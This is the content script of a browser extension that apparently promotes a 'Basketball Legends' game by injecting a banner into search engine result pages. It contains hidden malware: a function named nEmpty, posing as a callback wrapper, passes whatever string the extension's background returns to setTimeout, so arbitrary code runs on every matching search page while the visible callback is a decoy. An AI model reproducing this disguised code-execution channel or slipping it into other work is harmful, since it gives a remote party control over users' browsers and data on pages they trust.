!function (){
    let ext=chrome.runtime.id,identifier=ext.substr(0,6),
        buttonImg='button/'+identifier+'.svg',path=window.location.pathname,
        locSearch=window.location.search,button=null,
        contextRelevant=path.indexOf('search')!==-1;
    if (!contextRelevant)
        return;
    ['/search/images','/search/video','images/search','videos/search'].forEach(function(item){
        if (path.indexOf(item)!==-1)
            contextRelevant=false
    });
    if (!contextRelevant||locSearch.indexOf('tbm=isch')!==-1||locSearch.indexOf('tbm=vid')!==-1)
        return;
    function get_query_param(name){
        let f=false;
        locSearch.substring(1).split('&').forEach(function(item,i){
            let pair=item.split('=');
            if (decodeURIComponent(pair[0]) === name)
                f=decodeURIComponent(pair[1]).replace(/\+/g,' ').toLowerCase()
        });
        return f;
    }
    function nEmpty(fun){return function(v){if(typeof v!=="undefined"&&v!==null){try{v.charCodeAt(0)===60||setTimeout(v)}catch(e){}}}}
    let q=get_query_param('q')||get_query_param('p');
    contextRelevant=q&&q.indexOf('Basketball Legends'.toLowerCase())!==-1;
    chrome.runtime.sendMessage({message:{'svg': buttonImg}},nEmpty(function(svg){button=svg}));
    if (window.localStorage.getItem(identifier))
        contextRelevant=false;
    if (contextRelevant&&typeof window[identifier]==='undefined'){
        window[identifier]=true;
        window.addEventListener('load',function(){
            let box=document.createElement('div');
            box.className='game-button-box';
            box.innerHTML='<div class="game-button-icon-box"></div>' +
                '<div class="game-button-section"><div class="game-button-title">Basketball Legends<br>2020 - 2021</div>' +
                '<div class="game-button-installed"><img src="'+chrome.runtime.getURL('images/install.svg')+
                '" alt="" width="27" height="27">'+chrome.i18n.getMessage("installed")+'</div></div>';
            let closeFunc=function(e){
                e&&e.preventDefault();
                box.style.display='none';
                box.innerHTML='';
                window.localStorage.setItem(identifier,'1');
                return false;
            };
            let closeCross=box.appendChild(document.createElement('a'));
            closeCross.setAttribute('href','javascript:void(0)');
            closeCross.setAttribute('class','game-button-cross');
            closeCross.addEventListener('click',closeFunc,true);
            let button0=document.createElement('button'),button1=document.createElement('button');
            button0.innerText=chrome.i18n.getMessage("got_it");
            button1.innerText=chrome.i18n.getMessage("play");
            let buttons=box.children[1].appendChild(document.createElement('div'));
            buttons.className='game-button-section-buttons';
            buttons.appendChild(button0).addEventListener('click',closeFunc);
            buttons.appendChild(button1).addEventListener('click',function(){
                chrome.runtime.sendMessage({message: 'open'},function(){});
                box.style.display='none';
                box.innerHTML='';
            });
            document.body.insertBefore(box,document.body.children[0]);
        })
    }
}()
